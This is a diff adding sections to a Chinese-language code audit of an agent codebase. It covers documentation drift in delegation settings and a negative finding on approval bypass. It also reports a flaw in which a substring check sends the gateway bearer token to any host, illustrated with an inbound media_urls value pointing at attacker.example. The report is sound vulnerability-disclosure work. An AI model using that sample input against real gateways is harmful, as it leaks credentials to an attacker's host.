@@ -551,6 +551,58 @@ print("核对 file:", "file" in ks)
 以句号收尾、读起来像完整枚举。本轮不把这一半也判成 ▲——需要先确认那 28 个里
 有多少是对外可用的键、有多少是内部/别名,而这属于 R9D 的工具面射程。已列为移交。)*
 
+### 5.5 委派簇:一条 ▲ 与一条**值得记的负结论**
+
+**(一)▲:`AGENTS.md` 说 `max_spawn_depth` 默认 2,实际是 1。**
+
+这一段归 `AGENTS.md:983` 的 `## Delegation (\`delegate_task\`)` 管。
+
+`AGENTS.md:1003 @ 863e313`
+
+> - `role="orchestrator"` — retains `delegate_task` so it can spawn its
+
+紧随其后的第 1005 行写 `bounded by \`delegation.max_spawn_depth\` (default 2)`。代码侧:
+
+`hermes_cli/config_defaults.py:1717 @ 863e313`
+
+```
+        "max_spawn_depth": 1,        # depth (1 = flat [default], 2 = orchestrator→leaf, 3+ = deeper)
+```
+
+`tools/delegate_tool.py:127 @ 863e313`
+
+```
+MAX_DEPTH = 1  # flat by default: parent (0) -> child (1); grandchild rejected unless max_spawn_depth raised.
+```
+
+**两处代码都写 1,且都把 1 标注为 default。** 文档的 2 恰好是代码注释里
+「2 = orchestrator→leaf」那一档——像是把「编排者能用的那一档」误记成了默认值。
+后果具体:照文档预期,一个 orchestrator 应当能生出孙子;实际默认配置下**孙子会被拒**。
+
+**(二)负结论:委派**不能**绕过审批——本轮唯一一个「守卫真的被问了」的扩展面。**
+
+子代理对「子 agent 能否绕过父 agent 的审批闸门」做了专门排查,结论是**不能**,
+且**没有** ■。主线复核其两条支撑并通过:
+
+`tools/delegate_tool.py:106 @ 863e313`
+
+```
+    Config key: delegation.subagent_auto_approve (bool, default False).
+```
+
+即 YOLO 旁路**默认关闭**;关闭时装的是拒绝式回调,其文案为
+`"Set delegation.subagent_auto_approve: true to allow."`(`:84`)——**默认答案是拒绝,比父 agent 更严。**
+
+**这条负结论为什么值得单独记**:本轮前面已连撞三次「守卫在、但有一条路不问它」
+(§1 内联 shell、§2 密钥透传、§5.1-f 验证门)。如果不把**问了守卫的那一个**也记下来,
+本章会读成「这个代码库到处漏」——而事实是:**最像会漏的那一个(把活交给另一个 agent)
+恰恰是做得最严的**。`tools/delegate_tool.py` 出现在 §1.3 那 32 个 import 审批模块的文件里,
+不是巧合。
+
+按 CLAUDE.md 对负结论的要求,这条的可信度取决于搜索面。**搜索面来自子代理**
+(31 行命中分四类),主线只复核了上述两个锚点,**未独立重跑那次全量排查**——
+故本条在报告中标注为「子代理取证 + 主线抽核」,不按主线全证条目计。
+
 ### 5.3 一条方法学收获:为什么 R8D 那两个锚点会漂
 
 R8D 的 `:667` / `:235` 各差一行,而同一份底稿里**带代码块的锚点全部正确**。成因是结构性的:
@@ -626,3 +678,128 @@ except TypeError as e:
 主线不重复它的搜索面,只补一句自己观察到的:**它先打印表头再崩**——
 一个只看前两行输出的人会以为它在工作。这与本轮 §1.5 的形状是同一类:
 **部分正确的输出比完全没有输出更能掩盖故障。**
+
+### 5.6 两路子代理独立撞上同一条 ▲,主线复核后合并计一条
+
+读 `tools/delegate_tool.py` 与读 `tools/async_delegation.py` 的两路子代理**互不通气**,
+却各自报了 `AGENTS.md` 委派段的同两条 ▲。**跨轮 ▲ 计数按去重后计**,此处记 **2 条**,不是 4 条。
+
+**▲(a)`max_spawn_depth` 默认值**:已在 §5.5(一)取证,文档 2 / 代码 1。
+两路给的锚点一致(`AGENTS.md:1005`),主线复核通过。
+*一个值得记的细节*:`website/docs` 那份写的是对的,错的只有 `AGENTS.md`——
+同一件事两份文档说法不同,而根目录那份(最可能被新人先读到的那份)是错的那份。
+
+**▲(b)`background` 的语义**:`AGENTS.md:986-989` 说父 agent **默认等**孩子,
+`background=true` 才转异步。代码相反——顶层**一律**后台,而 schema 里那个参数是废弃品。
+
+`run_agent.py:7657 @ 863e313`
+
+```
+        # The schema-level `background` param is intentionally ignored here.
+        _is_subagent = getattr(self, "_delegate_depth", 0) > 0
+```
+
+工具 schema 自己也这么标:
+
+`tools/delegate_tool.py:3857 @ 863e313`
+
+```
+                    "DEPRECATED / IGNORED. Top-level single and batch "
+```
+
+**这条比(a)更值得记**:(a) 是一个数字漂了,(b) 是**默认行为整个反过来了**,
+而且文档还教了一个已被废弃的参数怎么用。一个照 `AGENTS.md` 写集成的人,
+会以为自己能选同步——实际拿到的永远是一个 `delegation_id`。
+
+### 5.7 H-R8D-b 的复核结论:移交项本身有一半不成立
+
+做这条移交项的子代理**推翻了移交项的一半**,主线复核其关键支撑并通过。这正是复核该有的样子。
+
+- **区间边界**:R8D 记 `6757-9180`,实际小节是 `6755-9178`;R8D 自己给的行数 2422 与它自己的
+  标签差 2 行(尾部两行属于下一小节的横幅)。总量口径「约 3,881 行」无误。
+- **实质错误**:**进程监管器不是一段连续区间**,段 B 之外另有 5 处,最大一处是
+  `hermes_cli/kanban_db.py:4454-4597` 的 `release_stale_claims`(144 行)。
+- **「与任务板无关」只对段 A 成立**:段 B 只有 18.7% 是通用监管原语,57.2% 是任务板调度业务。
+
+主线抽核了它最独立的一条断言——`waitpid(-1, ...)` 全仓唯一:
+
+```verify
+cd /home/user/hermes-agent && grep -rn "waitpid(-1\|waitpid( *-1" --include="*.py" . | grep -v "^./tests" | wc -l
+# → 1     (唯一命中在 hermes_cli/kanban_db.py:6941)
+```
+
+**所以 R8D 那条教训要改写。** R8D 记的是「按**文件**判层会把大文件里的异质区间一起判掉」;
+本轮实测补上后半句:**按**区间**判层同样会切断跨区间的机制**。
+真正的教训不是「粒度该细到区间」,而是——**任何固定粒度都会切错某些机制,
+因为机制的边界不服从文件或行号的边界**。台账能做的是**记录读到哪**,不是假装能表达机制边界。
+
+### 5.8 本轮最重的一条 ■(主线全链复核):网关 bearer 挂给任意主机
+
+做 H-R8D-e 普查的子代理在**移交项射程之外**发现了一条比锚点本身严重一个量级的问题。
+主线**把整条链从入站数据到出网请求逐段复核**,结论成立。
+
+**第一段——判据是纯子串,没有任何主机校验:**
+
+`gateway/relay/media.py:92 @ 863e313`
+
+```
+    def is_relay_media_url(self, url: str) -> bool:
+        """Is ``url`` a connector re-host reference (needs our bearer to GET)?"""
+        return "/relay/media/" in (url or "")
+```
+
+**第二段——这个布尔直接决定要不要挂网关 bearer:**
+
+`gateway/relay/media.py:164 @ 863e313`
+
+```
+        needs_auth = self.is_relay_media_url(url)
+        if needs_auth and not self.enabled:
+            return None
+        headers = {}
+        if needs_auth:
+            headers["Authorization"] = f"Bearer {self._bearer()}"
+
+        def _get() -> Optional[str]:
+            req = urllib.request.Request(url, headers=headers)
+```
+
+**第三段——URL 来自入站事件,不是本地配置:**
+
+`gateway/relay/adapter.py:461 @ 863e313`
+
+```
+            urls = list(getattr(event, "media_urls", None) or [])
+            if not urls:
+                return
+            client = self._get_media_client()
+            localized: list[str] = []
+            for url in urls:
+                if not isinstance(url, str) or not url:
+                    continue
+```
+
+同一函数在 `:474` 把每个 url 交给 `client.download(url)`。
+
+**判据(输入 → 现象)**:一条入站中继事件带
+`media_urls: ["https://attacker.example/relay/media/x"]` → 子串命中 →
+`Authorization: Bearer <网关 bearer>` 被送到 `attacker.example`。
+
+**作者的本意写在同一个 docstring 里**,而且写对了形状:
+
+`gateway/relay/adapter.py:449 @ 863e313`
+
+> The wire's ``media_urls`` name connector re-hosts
+> (``{connector}/relay/media/{id}``, per-gateway-bearer-authenticated) or
+
+**期望的是 `{connector}/relay/media/{id}` 这种带主机前缀的形状,实现的却是一次 `in` 判断。**
+这与 §3 的 `max_iterations` 是同一类腐烂的两种形态:那里是文档跟不上代码,这里是代码跟不上文档。
+
+**严重性要说准,不跟着子代理放大。** 子代理写「攻击者不需要任何本地权限」——
+字面为真,但完整的前提是**攻击者需要能让一条入站中继事件带上他的 URL**。
+这比「本地已提权」低得多,但也不是「任何互联网用户」。准确表述是:
+**任何能向该网关投递入站中继事件 `media_urls` 的一方,都能拿到网关 bearer。**
+
+**记 ■ 不记 ▲**:文档(docstring)是对的,错的是实现。
+这也是本轮**唯一一条主线从入站数据源一路复核到出网请求的条目**,
+其余子代理条目按抽核处理。
